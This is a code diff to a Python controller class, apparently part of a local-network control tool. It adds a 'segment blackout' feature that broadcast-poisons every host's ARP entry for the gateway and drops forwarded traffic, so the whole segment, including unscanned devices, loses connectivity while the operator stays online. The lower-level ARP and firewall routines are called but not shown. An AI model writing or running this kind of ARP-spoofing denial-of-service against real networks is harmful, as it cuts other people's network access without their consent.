@@ -89,6 +89,9 @@ class Controller:
         # emit) so the alert actually reaches the operator instead of a no-op.
         self._alert_cb: Callable[[str], None] | None = None
 
+        # Segment-blackout mode (broadcast gateway poison + FORWARD drop).
+        self.blackout_active = False
+
     def start(self):
         """Bootstrap the engine."""
         self._running = True
@@ -315,6 +318,7 @@ class Controller:
         # Best-effort, isolated: a raise in one step (e.g. xdp.unload via bcc)
         # must not prevent the others — above all restore_network — from running.
         for name, step in (
+            ("arp.blackout_stop", self.arp.blackout_stop),
             ("arp.restore_all", self.arp.restore_all),
             ("arp.stop_watchdog", self.arp.stop_watchdog),
             ("dns.stop_all", self.dns.stop_all),
@@ -549,6 +553,43 @@ class Controller:
         for ip, dev in list(self.devices.items()):
             if dev.cut or dev.limited:
                 self.restore_device(ip, log)
+
+    def toggle_blackout(self, state: bool, log=None) -> bool:
+        """Segment blackout: broadcast-poison every host's gateway entry and drop
+        in FORWARD, so the whole segment (including devices not in the table)
+        loses the gateway while the operator stays online.
+
+        Distinct from cut_all(): one broadcast poison instead of N unicast cuts,
+        and it catches hosts that were never scanned. The gateway guard is
+        untouched — this doesn't cut the gateway, it poisons the clients' entry
+        *for* the gateway and keeps the gateway reachable by us.
+        """
+        if not self.net.gateway or not self.net.iface:
+            if log:
+                log("✕ Blackout needs an interface and gateway", "err")
+            return False
+        if state:
+            self.nft.blackout(True)
+            ok = self.arp.blackout_start(self.net.gateway, self.net.iface, self.net.my_ip)
+            if not ok:
+                # Couldn't resolve gateway/our MAC — don't leave a drop armed.
+                self.nft.blackout(False)
+                self.blackout_active = False
+                if log:
+                    log("✕ Blackout failed — could not resolve the gateway MAC", "err")
+                return False
+            self.blackout_active = True
+            db.log_operation("blackout", detail="segment blackout engaged")
+            if log:
+                log("⬛ BLACKOUT — whole segment loses the gateway; you stay online", "atk")
+            return True
+        self.arp.blackout_stop()
+        self.nft.blackout(False)
+        self.blackout_active = False
+        db.log_operation("blackout", detail="segment blackout lifted")
+        if log:
+            log("⬛ Blackout lifted — segment healed", "ok")
+        return True
 
     # ── Bandwidth shaping ─────────────────────────────────────────────────────
 
